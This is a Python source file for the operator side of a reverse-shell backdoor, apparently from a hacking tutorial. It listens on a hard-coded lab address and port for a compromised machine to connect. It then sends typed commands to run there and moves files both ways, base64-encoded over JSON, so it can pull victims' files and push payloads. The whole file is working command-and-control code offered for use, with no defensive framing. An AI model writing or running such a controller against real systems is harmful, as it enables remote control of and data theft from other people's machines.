import socket
import base64
import simplejson

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("Listening...")
        (self.my_connection, my_address) = listener.accept()
        print("Connection established from " + str(my_address))

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data=""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def read_file(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download successfull"

    def command_execution(self,command):
        self.json_send(command)
        if command[0] == "quit":
            self.my_connection.close()
            exit()
        return self.json_receive()

    def start_listener(self):
        while True:
            command = input("Enter command: ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    content = self.read_file(command[1])
                    command.append(content)
                output = self.command_execution(command)
                if command[0] == "download" and "ERROR" not in output:
                    output = self.save_file(command[1],output)
            except Exception:
                output = "ERROR"
            print(output)

my_listener = Listener("10.0.2.10",8080)
my_listener.start_listener()
